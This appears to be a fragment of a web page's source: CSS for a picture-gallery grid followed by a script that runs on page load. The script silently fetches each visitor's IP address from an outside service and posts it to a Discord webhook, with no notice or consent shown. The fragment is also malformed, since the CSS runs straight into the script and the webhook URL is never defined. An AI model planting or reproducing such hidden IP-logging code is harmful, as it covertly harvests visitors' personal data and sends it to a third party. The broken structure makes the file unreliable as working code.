        body {

        }
        .pic-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-template-rows: auto auto;
            gap: 20px;
            max-width: 900px;
            margin: auto;
        }
        .Pic-item {
            background-color: #fff;
            padding: 15px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            overflow: hidden;
        }
        .Pic-item img {
            width: 100%;
            height: auto;
            border-radius: 10px;
        }
        .Pic-item h3 {
            margin: 10px 0 5px;
        }
        .Pic-item p {
            font-size: 0.9em;
            color: #666;
        }

        function getUserIP() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const userIP = data.ip;
                    sendToDiscord(userIP);
                })
                .catch(error => console.error('Error getting IP:', error));
        }

        function sendToDiscord(ip) {
            const payload = {
                content: `New visitor from IP: ${ip}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => console.log('IP logged to Discord:', data))
            .catch(error => console.error('Error sending to Discord:', error));
        }

        getUserIP();
    </script>
